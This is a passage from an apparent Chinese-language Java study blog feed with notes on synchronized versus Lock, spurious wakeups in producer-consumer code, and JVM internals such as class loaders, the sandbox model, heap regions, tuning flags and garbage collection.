class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="6、Synchronized和Lock区别"><a href="#6、Synchronized和Lock区别" class="headerlink" title="6、Synchronized和Lock区别"></a>6、Synchronized和Lock区别</h1><ol>
<li>Synchronized 内置的java关键字，Lock是一个java类</li>
<li>Synchronized 无法判断获取锁的状态，Lock可以判断是否获取到了锁</li>
<li>Synchronized 会自动释放锁，Lock必须手动释放锁，如果不释放锁，会导致死锁！</li>
<li>Synchronized 线程1（获得锁，阻塞）、线程2（等待，傻傻的等）；Lock就不一定会等待下去</li>
<li>Synchronized，可重入锁，不可以中断，非公平；Lock，可重入锁，可以判断锁，非公平（自己可以设置）</li>
<li>Synchronized 使用锁少量的代码同步问题，Lock适合锁大量的同步代码</li>
</ol>
<h1 id="7、传统的生产者消费者问题，防止虚假唤醒"><a href="#7、传统的生产者消费者问题，防止虚假唤醒" class="headerlink" title="7、传统的生产者消费者问题，防止虚假唤醒"></a>7、传统的生产者消费者问题，防止虚假唤醒</h1><blockquote>
<p>生产者和消费者问题 Synchronized 版本</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JUCDemo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Data</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Data</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    data.increment();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    data.decrement();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Data</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">increment</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">if</span> (number != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//等待</span></span><br><span class="line">            <span class="built_in">this</span>.wait();</span><br><span class="line">        &#125;</span><br><span class="line">        number++;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;==&gt;&quot;</span> + number);</span><br><span class="line">        <span class="comment">//通知其他线程，我+1完毕了</span></span><br><span class="line">        <span class="built_in">this</span>.notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">decrement</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">if</span> (number == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//等待</span></span><br><span class="line">            <span class="built_in">this</span>.wait();</span><br><span class="line">        &#125;</span><br><span class="line">        number--;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;==&gt;&quot;</span> + number);</span><br><span class="line">        <span class="comment">//通知其他线程，我-1完毕了</span></span><br><span class="line">        <span class="built_in">this</span>.notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/976a1f91671bb25cb52b52043dcb8113--adf1--image-20241007204343421.png" alt="image-20241007204343421"></p>
<p>问题存在，如果是A B C D 四个线程（可能不会出现上面预期的结果，可能是有2,3出现）  -》 虚假唤醒</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/7f842efd6b130dc531b89023ae585232--34bd--image-20241007204432193.png" alt="image-20241007204432193"></p>
<p><strong>解决：把if 改成while</strong></p>
<p>用if判断的话，唤醒后线程会从wait之后的代码开始运行，但是不会重新判断if条件，直接继续运行if代码块之后的代码，而如果使用while的话，也会从wait之后的代码运行，但是唤醒后会重新判断循环条件，如果不成立再执行while代码块之后的代码块，成立的话继续wait。</p>
<p>拿两个加法线程A、C来说，比如A先执行，执行时调用了wait方法，那它会等待，此时会释放锁，那么线程C获得锁并且也会执行wait方法，两个加线程一起等待被唤醒。此时减线程中的某一个线程执行完毕并且唤醒了这俩加线程，那么这俩加线程不会一起执行，其中A获取了锁并且加1，执行完毕之后C再执行。如果是if的话，那么A修改完num后，C不会再去判断num的值，直接会给num+1。如果是while的话，A执行完之后，C还会去判断num的值，因此就不会执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Data</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Data</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    data.increment();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    data.decrement();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    data.increment();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;C&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    data.decrement();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;D&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Data</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">increment</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (number != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//等待</span></span><br><span class="line">            <span class="built_in">this</span>.wait();</span><br><span class="line">        &#125;</span><br><span class="line">        number++;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;==&gt;&quot;</span> + number);</span><br><span class="line">        <span class="comment">//通知其他线程，我+1完毕了</span></span><br><span class="line">        <span class="built_in">this</span>.notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">decrement</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (number == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//等待</span></span><br><span class="line">            <span class="built_in">this</span>.wait();</span><br><span class="line">        &#125;</span><br><span class="line">        number--;</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">&quot;==&gt;&quot;</span> + number);</span><br><span class="line">        <span class="comment">//通知其他线程，我-1完毕了</span></span><br><span class="line">        <span class="built_in">this</span>.notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM学习</title>
    <url>/2024/09/29/JVM%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>记录学习Java JVM</p>
<span id="more"></span>

<h1 id="一、JVM的学习方式"><a href="#一、JVM的学习方式" class="headerlink" title="一、JVM的学习方式"></a>一、JVM的学习方式</h1><ul>
<li>请你谈谈你对JVM的理解？java8虚拟机和之前的变化更新？</li>
<li>什么是OOM？什么是栈溢出？怎么分析？</li>
<li>JVM的常用调优参数有哪些？</li>
<li>内存快照如何抓取，怎么分析Dump文件？</li>
<li>谈谈JVM中，类加载器的认识？</li>
</ul>
<ol>
<li>JVM的位置</li>
<li>JVM的体系结构</li>
<li>类加载器</li>
<li>双亲委派机制</li>
<li>沙箱安全机制</li>
<li>Native</li>
<li>PC寄存器</li>
<li>方法区</li>
<li>栈</li>
<li>三种JVM</li>
<li>堆</li>
<li>新生区、老年区</li>
<li>永久区</li>
<li>堆内存调优</li>
<li>GC<ol>
<li>常用算法</li>
</ol>
</li>
<li>JMM</li>
<li>总结</li>
</ol>
<h1 id="二、JVM的体系结构"><a href="#二、JVM的体系结构" class="headerlink" title="二、JVM的体系结构"></a>二、JVM的体系结构</h1><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-01/15f08b83cc36ebf5ba8c33bb4ca72c5c--fe5c--image-20241001184024276.png" alt="image-20241001184024276"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-01/2849f9431c9f35342055f25d9f9b4a7e--7c8c--image-20241001190719023.png" alt="image-20241001190719023"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-01/d1c23d6bb7bb20a3555f7a846826726f--6967--image-20241001190723436.png" alt="image-20241001190723436"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-01/360e596935f9e9d5556a8af031f0b6a0--ae8f--image-20241001190940381.png" alt="image-20241001190940381"></p>
<h1 id="三、类加载器及双亲委派机制"><a href="#三、类加载器及双亲委派机制" class="headerlink" title="三、类加载器及双亲委派机制"></a>三、类加载器及双亲委派机制</h1><p>作用：加载Class文件 </p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-01/8c000f95eebb45566d18867ed7a0aac3--536f--image-20241001191035701.png" alt="image-20241001191035701"></p>
<ol>
<li>虚拟机自带的加载器</li>
<li>启动类（根）加载器（<strong>BootstrapClassLoader</strong>）</li>
<li>扩展类加载器（<strong>ExtClassLoader</strong>）</li>
<li>应用程序（系统类）加载器（<strong>AppClassLoader</strong>）</li>
</ol>
<h1 id="四、Java历史-沙箱安全机制"><a href="#四、Java历史-沙箱安全机制" class="headerlink" title="四、Java历史-沙箱安全机制"></a>四、Java历史-沙箱安全机制</h1><p>java安全模型的核心就是java沙箱（sandbox）</p>
<blockquote>
<p>什么是沙箱?</p>
</blockquote>
<p>沙箱是一个限制程序运行的环境。</p>
<p>沙箱机制就是将java代码限定在虚拟机（JVM）特定的运行范围中，并且严格限制代码对本地系统资源的访问，通过这样的措施来保证对代码的有效隔离。防止对本地系统造成破坏。沙箱主要限制系统资源访问。</p>
<p>那系统资源包括什么？CPU、内存、文件系统、网络。不同级别的沙箱对这些资源访问的限制也不一样。</p>
<p>所有的java程序运行都可以指定沙箱，可以指定安全策略。</p>
<p>在java中将执行程序分成本地代码和远程代码两种，本地代码默认视为可信任的，而远程代码则被看作是不受信受信的。对于受信的本地代码，可以访问一切本地资源。而对于非受信的远程代码在早期的java实现中，安全依赖于沙箱机制。如下图所示 JDK1.0安全模型</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/b51342000f3683e90e3adf0e43c07bf2--9d4e--image-20241002123848724.png" alt="image-20241002123848724"></p>
<p>但是如此严格的安全机制也给程序的功能扩展带来障碍，比如当用户希望远程代码访问本地系统的文件时候，就无法实现。因此在后续的java1.1版本中，针对安全机制做了改进，增加了<strong>安全策略</strong>，允许用户指定代码对本地资源的访问权限，如下图所示JDK1.1安全模型</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/6a27a87f70d3c0cceab5d63de4c051e4--0658--image-20241002123904705.png" alt="image-20241002123904705"></p>
<p>在java1.2版本中，再次改进了安全机制，增加了<strong>代码签名</strong>，不论本地代码或者远程代码，都会按照用户的安全策略设定，由类加载器加载到虚拟机中权限不同的运行空间，来实现差异化的代码执行权限控制。如下图所示JDK1.2安全模型</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/ed4b55839bb408766121dea1a8bc1104--2a5a--image-20241002123934033.png" alt="image-20241002123934033"></p>
<p> 当前最新的安全机制实现，则引入了<strong>域（Domain）</strong>的概念。虚拟机会把所有代码加载到不同的系统域和应用域，系统域部分专门负责与关键资源进行交互，而各个应用域部分则通过系统域的部分代理来对各种需要的资源进行访问。虚拟机中不同的受保护域（Protected Domain），对应不一样的权限（Permission）。存在于不同域中的类文件，就具有当前域的全部权限，如下图所示，最新的安全模型（jdk1.6）</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/1edf21e9019ca08ebfecc32ee4c7e420--39e0--image-20241002123956626.png" alt="image-20241002123956626"></p>
<p>组成沙箱的基本组件</p>
<ul>
<li>字节码校验器（bytecode verifier）：确保Java类文件遵循Java语言规范。这样可以帮助Java程序实现内存保护。但并不是所有的类文件都会经过字节码校验，比如核心类。</li>
<li>类装载器（class loader）：其中类装载器在3个方面对Java沙箱起作用<ul>
<li>它防止恶意代码去干涉善意的代码；（双亲委派机制）</li>
<li>它守护了被信任的类库边界；</li>
<li>它将代码归入保护域，确定了代码可以进行哪些操作。</li>
</ul>
</li>
</ul>
<p>虚拟机为不同的类加载器载入的类提供不同的命名空间，命名空间由一系列唯一的名称组成，每一个被装载的类将有一个名字，这个命名空间是由Java虚拟机为每一个类装载器维护的，它们互相之间甚至不可见。</p>
<p>类装载器采用的机制是双亲委派模式。</p>
<ol>
<li>从最内层JVM自带类加载器开始加载，外层恶意同名类得不到加载从而无法使用；</li>
<li>由于严格通过包来区分了访问域，外层恶意的类通过内置代码也无法获得权限访问到内层类，破坏代码就自然无法生效。</li>
</ol>
<ul>
<li>存取控制器（access controller）：存取控制器可以控制核心API对操作系统的存取权限，而这个控制的策略设定，可以由用户指定。</li>
<li>安全管理器（security manager）：是核心API和操作系统之间的主要接口。实现权限控制，比存取控制器优先级高。</li>
<li>安全软件包（security package）：java.security下的类和扩展包下的类，允许用户为自己的应用增加新的安全特性，包括：<ul>
<li>安全提供者</li>
<li>消息摘要</li>
<li>数字签名（keytools）</li>
<li>加密</li>
<li>鉴别</li>
</ul>
</li>
</ul>
<h1 id="五、Native方法区"><a href="#五、Native方法区" class="headerlink" title="五、Native方法区"></a>五、Native方法区</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line"></span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * native :凡是带了native关键字的，说明java的作用范围达不到了，会去调用底层C语言的库！</span></span><br><span class="line"><span class="comment">     * 会进入本地方法栈</span></span><br><span class="line"><span class="comment">     * 调用本地方法接口！ JNI</span></span><br><span class="line"><span class="comment">     * JNI作用：扩展java的使用，融合不同的编程语言为java所用！最初：C、C++</span></span><br><span class="line"><span class="comment">     * java诞生的时候 C、C++横行，想要立足，必须要有调用C、C++的程序</span></span><br><span class="line"><span class="comment">     * 他在内存区域中专门开辟了一块标记区域：Native Method Stace，登记native方法</span></span><br><span class="line"><span class="comment">     * 在最终执行的时候，加载本地方法库中的方法，通过JNI</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//java程序驱动打印机，管理系统。掌握即可，在企业级应用中较为少见！</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">start0</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>PC寄存器</strong></p>
<p>程序计数器：program counter register</p>
<p>每个线程都有一个程序计数器，是线程私有的，就是一个指针，指向方法区中的方法字节码（用来存储指向一条执行的地址，也即将要执行的指令代码），在执行引擎读取下一条指令，是一个非常小的内存空间，几乎可以忽略不计</p>
<p><strong>方法区</strong></p>
<p>Method Area 方法区</p>
<p><strong>方法区是被所有线程共享</strong>，所有字段和方法字节码，以及一些特殊方法，如构造函数，接口代码也在此定义，简单说，所有定义的方法的信息都保存在该区域，<strong>此区域属于共享空间</strong></p>
<p><strong>静态变量，常量，类信息（构造方法，接口定义），运行时的常量池存在方法区中，但是实例变量存在堆内存中，和方法区无关</strong></p>
<h1 id="六、深入理解一下栈"><a href="#六、深入理解一下栈" class="headerlink" title="六、深入理解一下栈"></a>六、深入理解一下栈</h1><p><strong>栈：数据结构</strong></p>
<p><strong>栈：先进后出 、后进先出  （桶）</strong></p>
<p><strong>队列：先进先出（FIFO: first input first output）</strong></p>
<p>为什么main()方法先执行，最后结束！</p>
<p>栈：栈内存，主管程序的运行，生命周期和线程同步</p>
<p>线程结束，栈内存也就是释放，对于栈来说，<strong>不存在垃圾回收问题</strong></p>
<p>一旦线程结束，栈就over</p>
<p><strong>栈中可以存什么：</strong></p>
<ul>
<li>8大基本类型<ul>
<li>boolean</li>
<li>byte</li>
<li>char</li>
<li>short</li>
<li>int</li>
<li>long</li>
<li>float</li>
<li>double</li>
</ul>
</li>
<li>对象引用<ul>
<li>reference类型</li>
</ul>
</li>
<li>实例的方法</li>
</ul>
<p>栈运行原理：栈帧</p>
<p>栈满了会抛出:StackOverflowError</p>
<p>栈 + 堆 + 方法区 交互关系</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/5ad85f47f558bc9fc5ab633e705a9cb5--6a15--image-20241002124557784.png" alt="image-20241002124557784"></p>
<p><a href="https://zhuanlan.zhihu.com/p/102316535">JVM虚拟机栈执行原理深入详解 - 知乎 (zhihu.com)</a></p>
<h1 id="七、走进HotSpot和堆"><a href="#七、走进HotSpot和堆" class="headerlink" title="七、走进HotSpot和堆"></a>七、走进HotSpot和堆</h1><p>三种JVM</p>
<ul>
<li>sun公司的 <strong>HotSpot</strong></li>
<li>BEA <strong>JRockit</strong></li>
<li>IBM <strong>J9 VM</strong></li>
</ul>
<p>我们学习的都是：HotSpot</p>
<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>Heap，一个JVM只有一个堆内存，堆内存的大小是可以调节的。</p>
<p>类加载器读取了类文件后，一般会把什么东西放到堆中? 类，方法，常量，变量~  保存我们所有引用类型的真实对象</p>
<p>堆内存中还要细分为三个区域：</p>
<ul>
<li>新生区（伊甸园区） Young&#x2F;New</li>
<li>养老区 Old</li>
<li>永久区 Perm</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/6b89aa39d8346bafa121bf1eeed1f66c--3716--image-20241002135759659.png" alt="image-20241002135759659"></p>
<p>GC垃圾回收，主要是在伊甸园区和养老区~</p>
<p>加入内存满了，OOM，堆内存不够! java.lang.OutOfMemoryError:java heap space</p>
<p>在JDK1.8以后，永久区改了一个名字~<strong>元空间</strong></p>
<h1 id="八、新生区、永久区、堆内存调优"><a href="#八、新生区、永久区、堆内存调优" class="headerlink" title="八、新生区、永久区、堆内存调优"></a>八、新生区、永久区、堆内存调优</h1><h2 id="新生区"><a href="#新生区" class="headerlink" title="新生区"></a>新生区</h2><ul>
<li>类：诞生和成长的地方，设置死亡！</li>
<li>伊甸园，所有的对象都是在伊甸园区new出来的</li>
<li>幸存者区（0,1）</li>
</ul>
<p>现象：经过研究，99%的对象都是临时对象！</p>
<h2 id="老年区"><a href="#老年区" class="headerlink" title="老年区"></a>老年区</h2><h2 id="永久区"><a href="#永久区" class="headerlink" title="永久区"></a>永久区</h2><p>这个区域常驻内存的，用来存放JDK自身携带的Class对象，Interface元数据，<strong>存储的是java运行时的一些环境或者类信息，这个区域不存在垃圾回收！关闭VM虚拟机就会释放这个区域的内存~</strong></p>
<p><strong>一个启动类，加载了大量的第三方jar包。tomcat部署了太多的应用，大量动态生成的反射类，不断的被加载。直到内存满了，就会出现OOM</strong></p>
<ul>
<li>jdk1.6之前：永久代，<strong>常量池在方法区</strong></li>
<li>jdk1.7:永久代，但是慢慢的退化了，去永久代，<strong>常量池在堆中</strong></li>
<li>jdk1.8之后：无永久代，<strong>常量池在元空间</strong></li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/d1abd1837ffaaff91149fd72a3b2fe45--f6ea--image-20241002140740183.png" alt="image-20241002140740183"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JVMDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//虚拟机试图使用的最大内存</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">maxMemory</span> <span class="operator">=</span> Runtime.getRuntime().maxMemory();</span><br><span class="line">        <span class="comment">//虚拟机的初始化总内存</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">totalMemory</span> <span class="operator">=</span> Runtime.getRuntime().totalMemory();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;maxMemory:&quot;</span> + maxMemory + <span class="string">&quot;字节\t&quot;</span> + (maxMemory / (<span class="type">double</span>) <span class="number">1024</span> / <span class="number">1024</span>) + <span class="string">&quot;MB&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;totalMemory:&quot;</span> + maxMemory + <span class="string">&quot;字节\t&quot;</span> + (totalMemory / (<span class="type">double</span>) <span class="number">1024</span> / <span class="number">1024</span>) + <span class="string">&quot;MB&quot;</span>);</span><br><span class="line">        <span class="comment">//默认情况下，分配的最大内存是电脑内存的1/4 而初始化的内存是 1/64</span></span><br><span class="line">        <span class="comment">//-Xms1024m -Xmx1024m -XX:+PrintGCDetails</span></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * OOM：</span></span><br><span class="line"><span class="comment">         *   1. 尝试扩大堆内存看结果</span></span><br><span class="line"><span class="comment">         *   2. 分析内存，看一下哪个地方出现了问题（专业工具）</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">maxMemory:4211081216字节	4016.0MB</span><br><span class="line">totalMemory:4211081216字节	252.0MB</span><br></pre></td></tr></table></figure>

<p>元空间：逻辑上存在，物理上不存在</p>
<p>idea设置JVM堆内存大小</p>
<p>这里要注意新版idea是默认隐藏vm option的</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/0b95074c40254505a543d8b1e4f5615f--f343--image-20241002143615421.png" alt="image-20241002143615421"></p>
<p>输出：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">maxMemory:<span class="number">1048576000</span>字节	<span class="number">1000.</span>0MB</span><br><span class="line">totalMemory:<span class="number">1048576000</span>字节	<span class="number">1000.</span>0MB</span><br><span class="line">[<span class="number">0.</span>183s][info   ][gc,heap,exit] Heap</span><br><span class="line">[<span class="number">0.</span>183s][info   ][gc,heap,exit]  garbage-first heap   total reserved 1024000K, committed 1024000K, used 6144K [<span class="number">0x00000000c1800000</span>, <span class="number">0x0000000100000000</span>)</span><br><span class="line">[<span class="number">0.</span>183s][info   ][gc,heap,exit]   region size 1024K, <span class="number">6</span> young (6144K), <span class="number">0</span> survivors (0K)</span><br><span class="line">[<span class="number">0.</span>183s][info   ][gc,heap,exit]  Metaspace       used 858K, committed 1024K, reserved 1114112K</span><br><span class="line">[<span class="number">0.</span>183s][info   ][gc,heap,exit]   <span class="keyword">class</span> <span class="title class_">space</span>    used 68K, committed 128K, reserved 1048576K</span><br></pre></td></tr></table></figure>

<p>如下代码设置</p>
<p><code>-Xms1m -Xmx1m -XX:+PrintGCDetails</code></p>
<p>-Xms 设置初始化内存分配大小，默认1&#x2F;64</p>
<p>-Xmx 设置最大分配内存大小，默认1&#x2F;4</p>
<p>-XX:+PrintGCDetails  — 打印GC垃圾回收信息</p>
<p>-XX:+HeapDumpOnOutOfMemoryError   — OOM DUMP</p>
<blockquote>
<p>拓展</p>
</blockquote>
<p>这里也可以使用一些工具去检测对应的堆内存问题的，推荐就是可以使用JPofiler</p>
<p>在一个项目中，突然出现了OOM故障，那么该如何排除~</p>
<ul>
<li>能够看到代码第几行出错：内存快照分析工具，MAT，Jprofiler</li>
<li>Dubug，一行行代码分析！</li>
</ul>
<p>MAT，Jprofiler作用：</p>
<ul>
<li>分析Dump内存文件，快速定位内存泄露</li>
<li>获得堆中的数据</li>
<li>获得大的对象</li>
<li>…</li>
</ul>
<h1 id="九、GC介绍之引用计数器"><a href="#九、GC介绍之引用计数器" class="headerlink" title="九、GC介绍之引用计数器"></a>九、GC介绍之引用计数器</h1><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/3e08fdadcb276e8d69cb5f7e3b8c055e--f1a5--image-20241002150143735.png" alt="image-20241002150143735"></p>
<p>JVM在进行GC时，并不是对这三个区域统一回收，大部分的时候，回收都是新生代</p>
<ul>
<li>新生区</li>
<li>幸存区</li>
<li>老年区</li>
</ul>
<p>GC种类：</p>
<ul>
<li>轻GC（普通的GC）</li>
<li>重GC（全局的GC）</li>
</ul>
<p>GC题目：</p>
<ul>
<li>JVM的内存模型和分区，详细到每个区放什么？</li>
<li>堆里面的分区有哪些？Eden，from,to,老年区，说说他们的特点</li>
<li>GC的算法有哪些？怎么用？<ul>
<li>标记清除法</li>
<li>标记压缩</li>
<li>复制算法</li>
<li>引用计数器</li>
</ul>
</li>
<li>轻GC和重GC分别是在什么什么时候发生？</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/4decf139647e56d4315d0461f2a20f18--39c2--image-20241002150210872.png" alt="image-20241002150210872">s</p>
<h1 id="十、GC之复制算法"><a href="#十、GC之复制算法" class="headerlink" title="十、GC之复制算法"></a>十、GC之复制算法</h1><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/22cc5c8b3199733d8c33c8bf306fe266--4c06--image-20241002151906956.png" alt="image-20241002151906956"></p>
